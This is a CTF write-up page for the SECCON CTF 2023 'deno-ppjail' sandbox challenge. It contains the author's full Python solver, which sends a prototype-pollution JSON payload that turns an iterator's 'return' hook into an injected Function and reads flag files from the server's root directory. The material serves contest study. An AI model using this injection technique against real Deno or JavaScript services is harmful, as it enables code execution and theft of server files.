---
title: "Deno Ppjail - SECCON CTF 2023 Quals"
category: "misc"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "deno", "ppjail", "misc", "seccon-ctf-2023-quals"]
summary: "Do you like Deno better than Node?"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202309_SECCON_CTF_2023_Quals/sandbox/deno-ppjail"
license: "none stated"
ctf:
  name: "SECCON CTF 2023 Quals"
  year: 2023
  challenge: "Deno Ppjail"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202309_SECCON_CTF_2023_Quals/sandbox/deno-ppjail>
- **CTF:** SECCON CTF 2023 Quals

---

# [sandbox] deno-ppjail

## Description

Do you like Deno better than Node?

```
nc deno-ppjail.seccon.games 1337
```

## Attachments

- [deno-ppjail](files/deno-ppjail)

## Usage

Launch a challenge server:

```
cd build
docker compose up
```

Run the author's solver:

```
docker run -it \
    -e SECCON_HOST=localhost \
    -e SECCON_PORT=1337 \
    --network=host \
    (docker build -q ./solver)
```


## Solver: `exploit.py`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202309_SECCON_CTF_2023_Quals/sandbox/deno-ppjail/solver/exploit.py>

```python
import os
import pwn
import json

io = pwn.remote(os.getenv("SECCON_HOST"), os.getenv("SECCON_PORT"))

payload = """
for (const entry of Deno.readDirSync("/")) {
    if (entry.name.startsWith("flag-")) {
        const flag = new TextDecoder().decode(Deno.readFileSync("/" + entry.name));
        console.log(flag);
    }
}
""".strip()

input_str = json.dumps({
    "constructor": {
        "prototype": {
            # ref. https://tc39.es/ecma262/2023/multipage/abstract-operations.html#sec-iteratorclose
            #
            # > 3. Let innerResult be Completion(GetMethod(iterator, "return")).
            # > 4. If innerResult.[[Type]] is normal, then
            # >     a. Let return be innerResult.[[Value]].
            # >     b. If return is undefined, return ? completion.
            # >     c. Set innerResult to Completion(Call(return, iterator)).
            "return": {
                "__custom__": True,
                "type": "Function",
                "args": [
                    payload,
                ],
            },
        },
    },
    # Cause an error
    "toString": {
        "caller": {},
    },
})

io.sendlineafter(b"Input your JSON: ", input_str.encode())
print(io.recvall().decode())
```
